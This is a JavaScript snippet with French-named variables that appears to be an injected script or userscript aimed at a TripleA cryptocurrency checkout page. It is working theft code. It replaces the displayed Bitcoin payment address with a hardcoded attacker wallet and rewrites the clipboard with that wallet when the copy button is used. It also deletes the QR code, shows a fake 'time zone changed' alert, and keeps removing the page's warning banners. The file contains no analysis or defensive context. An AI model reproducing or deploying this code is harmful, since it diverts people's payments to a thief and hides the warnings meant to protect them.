(function() {
    'use strict';

    const ADRESSE_CRYPTO_MALVEILLANTE = "bc1qa6venfpvkn4q843pmyjp6y5yttfjd0rxenpv5u";
    let actionEffectuee = false;

    const detournerAdresse = () => {
        const boutonCopie = document.querySelector('.triplea-copy-icon-for-address');
        if (boutonCopie) {
            boutonCopie.addEventListener('click', () => {
                setTimeout(() => {
                    navigator.clipboard.writeText(ADRESSE_CRYPTO_MALVEILLANTE);
                }, 100);
            });
        }

        if (actionEffectuee) return false;

        const champAdresse = document.querySelector('.triplea-new-address');
        const conteneurQrCode = document.querySelector('.triplea-qrcode-container');

        if (champAdresse && conteneurQrCode) {
            champAdresse.innerText = ADRESSE_CRYPTO_MALVEILLANTE;
            
            conteneurQrCode.remove();
            console.log('QR code container removed');
            
            actionEffectuee = true;

            setTimeout(() => {
                alert("Le fuseau horaire a été modifié. Appuyez sur Fermer pour continuer.");
            }, 1000);

            return true;
        }
        return false;
    };

    const demarrerVerification = () => {
        const intervalle = setInterval(() => {
            if (detournerAdresse()) {
                clearInterval(intervalle);
            }
        }, 100);
    };

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', demarrerVerification);
    } else {
        demarrerVerification();
    }

    const observateur = new MutationObserver(() => {
        if (!actionEffectuee) {
            detournerAdresse();
        }
    });
    observateur.observe(document.body, { childList: true, subtree: true });

    setInterval(() => {
        document.querySelectorAll('[data-test-id="alert-wrapper-WARNING"]').forEach(alerte => {
            alerte.remove();
        });
    }, 100);
})();
